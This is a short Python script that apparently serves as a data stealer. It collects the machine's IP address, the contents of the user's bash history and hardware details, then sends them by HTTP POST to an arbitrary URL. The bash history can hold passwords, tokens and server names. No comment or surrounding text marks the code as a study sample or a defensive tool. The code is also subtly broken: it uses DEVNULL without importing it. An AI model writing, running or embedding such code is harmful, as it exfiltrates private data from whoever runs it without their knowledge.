import os
import ctypes
import sys
import platform
import subprocess
import requests
import socket

def get_ip_adress():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP


def get_command_history():
    cmd = 'cat {}/.bash_history'    
    return os.popen(cmd.format(os.path.expanduser('~'))).read()


def get_hardware_info():
  if sys.platform.startswith('linux'):
    try:
      hw_info = subprocess.check_output('lshw -short',
                  stderr=DEVNULL, shell=True)
    except:
      hw_info = ''
    if not hw_info:
      try:
        hw_info = subprocess.check_output('lspci',
                  stderr=DEVNULL, shell=True)
      except:
        hw_info = ''
      hw_info += '\n' +\
        os.popen('free -m').read().strip()
    return hw_info


def get_info(url):
  ip_adress = '\nIP Adress\n\n' + get_ip_adress()
  bash_history = '\nBash History\n\n' + get_command_history()
  hardware_info = 'Hardware Info\n' + get_hardware_info()
  infos = {
    'ip_adress': ip_adress,
    'bash_history': bash_history,
    'hardware_info': hardware_info
  }
  res = requests.post(url, json=infos)